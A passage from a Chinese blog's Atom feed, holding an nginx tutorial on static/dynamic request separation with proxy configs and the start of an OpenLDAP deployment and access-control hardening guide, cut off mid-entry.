    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>0x01 关于 <code>动静分离</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主要用于一些较大型的站点架构,这样做一定程度上可以有效减轻后端节点压力,也就是说,有时候你在前端url中看到的一个目录,其后端对应的很可能就是一个集群</span><br><span class="line">另外,这样会使网站更加静态化,利于缓存,可显著提高网站访问速度,有效实现前后端解耦,但这样无疑会加大开发的繁琐程度,前后端只能通过各种接口进行通信</span><br></pre></td></tr></table></figure></p><p>0x02 此次演示环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NginxHttpip: 192.168.3.49对应域名: reverse.orgnginx反向代理服务器</span><br><span class="line">OldLampip: 192.168.3.45对应域名: www.bwapp.cc假设为动态服务器</span><br><span class="line">OldLnmpip: 192.168.3.42对应域名: test.bwapp.org 假设为静态服务器</span><br></pre></td></tr></table></figure></p><p>0x03 务必先统一所有机器的host解析,因为等会儿要直接用域名的方式往后抛,如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/hosts</span><br><span class="line">  192.168.3.42test.bwapp.org bwapp.org</span><br><span class="line">  192.168.3.45bwapp.cc www.bwapp.cc</span><br><span class="line">  192.168.3.75  lvs.org</span><br><span class="line">  192.168.3.49reverse.org</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>0x04 匹配url中指定的<code>目录名</code>实现的分离<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/nginx/conf/nginx.conf</span><br><span class="line"></span><br><span class="line">worker_processes  1;</span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line">    sendfile        on;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line">    </span><br><span class="line">    # 先定义好代理池,即后端所有的web节点,因为实现已经在hosts中做好指向,所以此处可以直接用域名</span><br><span class="line">    upstream default_pools&#123;</span><br><span class="line">   server test.bwapp.org:80 weight=2;</span><br><span class="line">   server www.bwapp.cc:80;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    upstream static_pools &#123;</span><br><span class="line">   server test.bwapp.org:80;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    upstream dynamic_pools &#123;</span><br><span class="line">   server www.bwapp.cc:80;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  reverse.org;</span><br><span class="line">        location / &#123;</span><br><span class="line">            # root   html;</span><br><span class="line">            # index  index.html index.htm;</span><br><span class="line">    # 此为缺省代理池,意思只要没命中下面的目录就走这里向后抛</span><br><span class="line">    # 注意,所有向后抛的动作均要带上主机头和客户端真实ip,否则会报400错误</span><br><span class="line">    proxy_pass http://default_pools;</span><br><span class="line">    proxy_set_header Host  $host;</span><br><span class="line">    proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">location /static/ &#123;</span><br><span class="line">    # 当命中到url中访问的是此静态目录时,就直接抛给后端的test.bwapp.org节点去处理</span><br><span class="line">    proxy_pass http://static_pools;</span><br><span class="line">    proxy_set_header Host  $host;</span><br><span class="line">    proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location /dynamic/ &#123;</span><br><span class="line">    # 当命中到url中访问的是此动态目录时,就直接抛给后端的www.bwapp.cc节点去处理</span><br><span class="line">    proxy_pass http://dynamic_pools;</span><br><span class="line">    proxy_set_header Host  $host;</span><br><span class="line">    proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class="line">&#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># /usr/local/nginx/sbin/nginx -t</span><br><span class="line"># /usr/local/nginx/sbin/nginx -s reload</span><br></pre></td></tr></table></figure></p><p><img src="/img/default nginx proxy.gif" alt=""></p><p>0x05 匹配url中指定的<code>文件后缀</code>实现的分离<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"># cd /usr/local/nginx/conf/</span><br><span class="line"># mv nginx.conf nginx.conf.bak.dir</span><br><span class="line"># vi nginx.conf</span><br><span class="line"></span><br><span class="line">worker_processes  1;</span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line">    sendfile        on;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line">    </span><br><span class="line">    # 依然是先定义好代理池</span><br><span class="line">    upstream default_pools&#123;</span><br><span class="line">   server test.bwapp.org:80 weight=3;</span><br><span class="line">   server www.bwapp.cc:80;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    upstream static_pools &#123;</span><br><span class="line">   server test.bwapp.org:80;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    upstream dynamic_pools &#123;</span><br><span class="line">   server www.bwapp.cc:80;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  reverse.org;</span><br><span class="line">        location / &#123;</span><br><span class="line">            # root   html;</span><br><span class="line">            # index  index.html index.htm;</span><br><span class="line">    # 缺省代理池,具体同上</span><br><span class="line">    proxy_pass http://default_pools;</span><br><span class="line">    proxy_set_header Host  $host;</span><br><span class="line">    proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"># 当在url中命中到的是这些静态资源后缀时就抛给后面的静态服务器</span><br><span class="line">location ~ .*.(gif|jpg|jpeg|png|bmp|swf|css|js)$ &#123;</span><br><span class="line">proxy_pass http://static_pools;</span><br><span class="line">proxy_set_header Host  $host;</span><br><span class="line">proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 当在url中命中到的是这些动态脚本资源后缀时就抛给后面的动态服务器</span><br><span class="line">location ~ .*.(php|jsp|do)$ &#123;</span><br><span class="line">proxy_pass http://dynamic_pools;</span><br><span class="line">proxy_set_header Host  $host;</span><br><span class="line">proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class="line">&#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># /usr/local/nginx/sbin/nginx -t</span><br><span class="line"># /usr/local/nginx/sbin/nginx -s reload</span><br></pre></td></tr></table></figure></p><p><img src="/img/end nginx proxy.gif" alt=""></p><p>0x06 除了根据url中指定的目录或文件后缀,我们还可以<code>根据客户端的user-agent类型</code>来判断,实现让不同系统平台的请求抛到指定的后端节点上,如,<code>pc,ipad,iphone,android...</code>也可以通过判断浏览器类型类决定具体要抛给后端的哪个程序去处理,等等…,另外,在前面nginx安全部署时也有详细说明过,如何利用此特性来防各类爬虫,此处不再赘述,我们看实际效果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/nginx/conf/nginx.conf</span><br><span class="line"></span><br><span class="line">worker_processes  1;</span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line">    sendfile        on;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line">    </span><br><span class="line">    upstream default_pools&#123;</span><br><span class="line">   server test.bwapp.org:80 weight=3;</span><br><span class="line">   server www.bwapp.cc:80;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    upstream static_pools &#123;</span><br><span class="line">   server test.bwapp.org:80 weight=2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    upstream dynamic_pools &#123;</span><br><span class="line">   server www.bwapp.cc:80;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  lvs.org;</span><br><span class="line">        location / &#123;</span><br><span class="line"># root   html;</span><br><span class="line"># index  index.html index.htm;</span><br><span class="line">proxy_pass http://default_pools;</span><br><span class="line">proxy_set_header Host  $host;</span><br><span class="line">proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class="line">    </span><br><span class="line"># 当侦测到客户端用的是IE浏览器就抛给后端的动态服务器</span><br><span class="line">if ($http_user_agent ~* &quot;MSIE&quot;)&#123;</span><br><span class="line">proxy_pass http://dynamic_pools;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 当侦测到客户端用的是火狐浏览器就抛给后端的静态服务器</span><br><span class="line">if ($http_user_agent ~* &quot;Firefox&quot;)&#123;</span><br><span class="line">proxy_pass http://static_pools;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 当侦测到客户端用的是android设备就抛给后端的移动服务器,这里只是简单举个例子</span><br><span class="line">if ($http_user_agent ~* &quot;android&quot;)&#123;</span><br><span class="line">proxy_pass http://mobile_pools;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 专门用来侦测iphone设备</span><br><span class="line">if ($http_user_agent ~* &quot;iphone&quot;)&#123;</span><br><span class="line">proxy_pass http://static_pools;</span><br><span class="line">&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/img/browser nginx proxy.gif" alt=""></p><p>0x07 利用nginx实现缓存功能,待续…</p><p><br><br>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;乐趣无穷的nginx , 待续…^_^</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0x01 关于 &lt;code&gt;动静分离&lt;/code&gt;&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;主要用于一些较大型的站点架构,这样做一定程度上可以有效减轻后端节点压力,也就是说,有时候你在前端url中看到的一个目录,其后端对应的很可能就是一个集群&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;另外,这样会使网站更加静态化,利于缓存,可显著提高网站访问速度,有效实现前后端解耦,但这样无疑会加大开发的繁琐程度,前后端只能通过各种接口进行通信&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x02 此次演示环境&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;NginxHttp	ip: 192.168.3.49	对应域名: reverse.org		nginx反向代理服务器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;OldLamp		ip: 192.168.3.45	对应域名: www.bwapp.cc		假设为动态服务器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;OldLnmp		ip: 192.168.3.42	对应域名: test.bwapp.org 	假设为静态服务器&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x03 务必先统一所有机器的host解析,因为等会儿要直接用域名的方式往后抛,如下&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# vi /etc/hosts&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  192.168.3.42	test.bwapp.org bwapp.org&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  192.168.3.45	bwapp.cc www.bwapp.cc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  192.168.3.75  lvs.org&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  192.168.3.49	reverse.org&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="动静分离" scheme="https://evil-404.github.io/categories/%E5%8A%A8%E9%9D%99%E5%88%86%E7%A6%BB/"/>
    
    
      <category term="动静分离" scheme="https://evil-404.github.io/tags/%E5%8A%A8%E9%9D%99%E5%88%86%E7%A6%BB/"/>
    
  </entry>
  
  <entry>
    <title>初探 LDAP 安全 [ 一 ]</title>
    <link href="https://evil-404.github.io/2017-12-21-ldap-sec.html"/>
    <id>https://evil-404.github.io/2017-12-21-ldap-sec.html</id>
    <published>2017-12-20T20:09:17.000Z</published>
    <updated>2017-12-30T12:24:32.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>0x01 关于 ldap 的一些简单科普<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">`ldap` 基于tcp/ip的轻量级目录访问协议,属于X.500目录协议族的一个简化版本</span><br><span class="line">你可以暂时把它粗暴的理解成 `一种特殊类型的数据库` ,通常,这种数据库文件后缀都为`.ldif`,并使用特殊的节点查询语句来获取相应数据</span><br><span class="line">实际生产环境中,主要还是用它来做各种查询比较多,既是查询,也就意味着肯定会有大量的读操作</span><br><span class="line">虽然,ldap也支持一些简单的更新功能,即写,但一般都不会用,因为它在写方面的效率并不高</span><br><span class="line">如果真的是写比较多,直接用各种关系型数据库代替就好了,实在没必要用ldap,毕竟,术业有专攻</span><br><span class="line">另外,ldap 跨平台,功能简洁,易管理,配置,读性能也不错,亦可分布式部署`不知道是不是可以把它的分布式理解成windows域的目录树,目录林概念`</span><br><span class="line">用的最多的可能就是进行`集中身份验证`,最后,我们还需要知道的是,默认情况下,ldap的所有数据都是直接以明文传输的,容易被截获,不过好在它支持ssl</span><br></pre></td></tr></table></figure></p><p>0x02 其它的一些常用目录服务工具<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">X.500 过于庞大臃肿</span><br><span class="line">ldap  轻量且配置简单</span><br><span class="line">windows活动目录  有平台限制</span><br><span class="line">NIS个人暂时还没接触过</span><br></pre></td></tr></table></figure></p><p>0x03 了解ldap内部数据的大致存储方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">和常规关系型数据库不同的是,ldap并非按照常规的库,表,字段方式来存储数据</span><br><span class="line">而是按照一种特殊的倒树状结构层级来组织管理数据,此处的树指的就是目录信息树,即`DIT`</span><br><span class="line">所谓的目录信息树其实相当于专门用来进行读操作的数据库</span><br><span class="line">在DIT内部则由N个条目`entry`所组成,就相当于我们常规数据库表中每条具体的记录</span><br><span class="line">而条目的内容则是由具有唯一标识名`DN`的属性[Attribute]及属性对应的值[value]所组成的这么一个集合</span><br><span class="line">条目为ldap中最基础的操作单位,通常对ldap的增删改查都是以条目为基本单元进行的</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>如下则是一条完整的条目信息,其实就相当于常规关系型数据库中的一条记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">dn: cn=aima aima,ou=People,dc=ldapmaster,dc=org</span><br><span class="line">objectClass: posixAccount</span><br><span class="line">objectClass: inetOrgPerson</span><br><span class="line">objectClass: organizationalPerson</span><br><span class="line">objectClass: person</span><br><span class="line">objectClass: shadowAccount</span><br><span class="line">loginShell: /bin/bash</span><br><span class="line">uid: aima</span><br><span class="line">cn: aima aima</span><br><span class="line">uidNumber: 10000</span><br><span class="line">gidNumber: 173</span><br><span class="line">sn: sec</span><br><span class="line">givenName: aima</span><br><span class="line">homeDirectory: /home/aima</span><br><span class="line">shadowLastChange: 17520</span><br><span class="line">userPassword:: e1NTSEF9OExmZ2FyUHQzeGl2K0RscWVOQ09Ma0lxTnkxTWRVeE4=</span><br></pre></td></tr></table></figure></p><p>0x04 认识ldap中常见的一些缩写单词含义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dn  唯一标示,类似linux文件系统的绝对路径,通过dn我们可以快速查找到目录信息树中的任意一个节点</span><br><span class="line">    basedn也就是我们所说的目录信息树的根,rdn 则是相对标示名,即相对路径</span><br><span class="line">dc  一般用于将完整域名划分几部分,如,rootkit.org就会被表示为`dc=rootkit,dc=org`</span><br><span class="line">uid 用户id,通常来源于/etc/passwd</span><br><span class="line">cn  姓名,通常来源于/etc/group</span><br><span class="line">sn  姓</span><br><span class="line">o   组织[公司]名称,像这些只是从逻辑上分开</span><br><span class="line">ou  单位[部门]名称</span><br></pre></td></tr></table></figure></p><p>0x05 和很多服务相同,ldap服务同样也是工作在 C / S 架构模型下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务端负责提供整个目录信息树,客户端只需拿着相应的信息树查询工具,向服务端提交查询请求,而后,服务端要么响应给具体的条目数据,要么直接返回一个指针</span><br><span class="line">如果服务端返回的是指针,客户端还需再拿着该指针到指定的ldap服务器上去查询相应的条目数据</span><br></pre></td></tr></table></figure></p><p>此次演示环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CentOS6.8_x86_64 ip: 192.168.3.68ldapmaster</span><br><span class="line">CentOS6.8_x86_64 ip: 192.168.3.69ldapslave</span><br></pre></td></tr></table></figure></p><p>0x06 开始实战部署openldap,关于openldap本身其实并没什么太多好说的,就是ldap协议的一种具体实现而已</p><p>部署前环境准备,<code>安装整个基础环境包,统一所有机器时间,机器名...</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># yum groupinstall &quot;Development Tools&quot; -y</span><br><span class="line"># /usr/sbin/ntpdate time.nist.gov</span><br><span class="line"># crontab -e</span><br><span class="line">  */2 * * * * /usr/sbin/ntpdate time.nist.gov每两分钟同步一下时间</span><br><span class="line"># crontab -l</span><br><span class="line"># vi /etc/hosts</span><br><span class="line">  192.168.3.68 ldapmaster.org</span><br><span class="line">  192.168.3.69 ldapslave.org</span><br></pre></td></tr></table></figure></p><p>安装openldap及其必要的依赖库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># yum install openldap openldap-* -y</span><br><span class="line"># yum -y install nscd nss-pam-ldapd pcre pcre-*</span><br><span class="line"># yum -y update nss-softokn-freebl此处软件包有冲突,最好分开装</span><br><span class="line"># yum -y install nss-*</span><br><span class="line"># rpm -qa | grep openldap</span><br><span class="line"># id ldap安装完成后,会自动创建一个名为ldap的系统伪用户,专用用来跑ldap服务</span><br><span class="line"># slapd -V此处演示的openldap版本为2.4</span><br></pre></td></tr></table></figure></p><p>0x07 以上没问题后,我们开始来配置OpenLdap,此处依然使用兼容2.3版本的配置方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># cd /etc/openldap/</span><br><span class="line"># cp /usr/share/openldap-servers/slapd.conf.obsolete slapd.conf</span><br><span class="line"># ls -l</span><br></pre></td></tr></table></figure></p><p>设置ldap管理员密码,还是那句话,实际生产环境中,这个密码务必要足够的强壮<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># slappasswd -s klion   生成ldap管理员密码hash,并把它追加到ldap主配置中</span><br><span class="line"># slappasswd -s klion | sed -e &quot;s#&#123;SSHA&#125;#rootpw\t&#123;SSHA&#125;#g&quot; &gt;&gt;/etc/openldap/slapd.conf</span><br><span class="line"># tail -n 1 /etc/openldap/slapd.conf</span><br><span class="line">  rootpw&#123;SSHA&#125;rkmKIPz4B5y6MmGLqSZbMZy0JMVY/gzK</span><br><span class="line"># cp slapd.conf slapd.conf_`date +%Y%m%d`.bak</span><br></pre></td></tr></table></figure></p><p>修改ldap数据库及日志设置,注意配置文件中的所有配置项必须顶格写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/openldap/slapd.conf</span><br><span class="line">  # 先把默认的数据库配置全部注释掉</span><br><span class="line">  # database definitions</span><br><span class="line">  # database      bdb</span><br><span class="line">  # suffix        &quot;dc=my-domain,dc=com&quot;</span><br><span class="line">  # checkpoint    1024 15</span><br><span class="line">  # rootdn        &quot;cn=Manager,dc=my-domain,dc=com&quot;</span><br><span class="line">  </span><br><span class="line">  # 再来新增自己的数据库配置</span><br><span class="line">  database        bdb# 指定使用的数据库格式</span><br><span class="line">  suffix          &quot;dc=ldapmaster,dc=org&quot;# 指定域名</span><br><span class="line">  rootdn          &quot;cn=klion,dc=ldapmaster,dc=org&quot;# 指定ldap管理员的dn</span><br><span class="line">  rootpw  &#123;SSHA&#125;rkmKIPz4B5y6MmGLqSZbMZy0JMVY/gzK# ldap管理员的密码hash,就是我们上面设置的klion</span><br><span class="line">  </span><br><span class="line">  # 设置ldap日志</span><br><span class="line">  loglevel        296指定日志级别</span><br><span class="line">  cachesize       2000可以缓存的记录总数</span><br><span class="line">  checkpoint      2048 10每到2048K或者每10分钟把内存中的数据往数据库中写一次</span><br><span class="line"></span><br><span class="line">  # 修改ldap默认的ACL,此处,支持直接用正则表示,严禁允许直接匿名访问,非常危险,极易造成大量敏感信息泄露</span><br><span class="line">  # 建议把默认的access项全部注释掉,换成如下权限,所谓的 `ldap未授权` 的根源也就在这里</span><br><span class="line">  # 下面ACL只做简单demo参考,大家可根据自己的实际情况,把to后的*换成更具体的范围,把by 后的权限控制的更精细些</span><br><span class="line">  access to *</span><br><span class="line">    by self write</span><br><span class="line">    by anonymous auth</span><br><span class="line">    by user read</span><br><span class="line">  </span><br><span class="line"># egrep -v &quot;^$|#&quot; /etc/openldap/slapd.conf最后,检查配置</span><br></pre></td></tr></table></figure></p><p>详细的ACL编写,可直接参考其官方说明,如下<br><figure 